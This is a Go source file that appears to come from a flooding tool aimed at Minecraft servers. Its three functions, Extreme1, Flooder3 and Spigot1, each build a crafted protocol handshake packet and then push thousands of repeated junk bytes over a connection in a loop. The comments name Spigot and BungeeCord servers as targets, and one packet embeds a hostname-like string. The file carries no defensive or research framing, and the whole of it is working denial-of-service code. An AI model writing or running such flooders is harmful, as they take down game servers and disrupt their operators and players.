package methods

import (
	"fmt"
	"net"
	"reflect"
)

// getBytes puts given data into []byte slice
func getBytes(data ...interface{}) []byte {
	var bytes []byte

	for _, arg := range data {
		var argType = reflect.TypeOf(arg).String()

		switch argType {
		case "int":
			var integer = arg.(int)
			var intLowerBits = integer & 0xFF

			bytes = append(bytes, byte(intLowerBits))
		case "string":
			var str = arg.(string)

			bytes = append(bytes, []byte(str)...)
		default:
			fmt.Println("Unknown type!", argType)
		}
	}

	return bytes
}

// MethodData is used as an argument for functions below
type MethodData struct {
	Out     net.Conn
	Address string
	Loop    int
}

//Extreme1 is for spigot based servers
func Extreme1(data MethodData) {
	out := data.Out
	bytes := getBytes(15, 0, 99, 453, data.Address, 457, 1)

	one := getBytes(1)
	zero := getBytes(0)

	for i := 0; i < data.Loop; i++ {
		out.Write(bytes)

		for n := 0; n < 5000; n++ {
			out.Write(one)
			out.Write(zero)
		}
	}
}

// Flooder3 is used to attack BungeeCord
func Flooder3(data MethodData) {
	out := data.Out
	bytes := getBytes(0, 47, 20, 109, data.Address, 99, 45, 50, 50, 55, 55, 46, 114, 97, 122, 105, 120, 112, 118, 112, 46, 100, 101, 46, 99, -35, 2)

	one := getBytes(1)
	zero := getBytes(0)

	for i := 0; i < data.Loop; i++ {
		out.Write(bytes)

		for n := 0; n < 1900; n++ {
			out.Write(one)
			out.Write(zero)
		}
	}
}

// Spigot1 is for spigot o_O
func Spigot1(data MethodData) {
	out := data.Out
	bytes := getBytes(15, 0, 47, 9, data.Address, 99, 224, 1)

	one := getBytes(1)
	zero := getBytes(0)

	for i := 0; i < data.Loop; i++ {
		out.Write(bytes)

		for n := 0; n < 1000; n++ {
			out.Write(one)
			out.Write(zero)
		}
	}
}
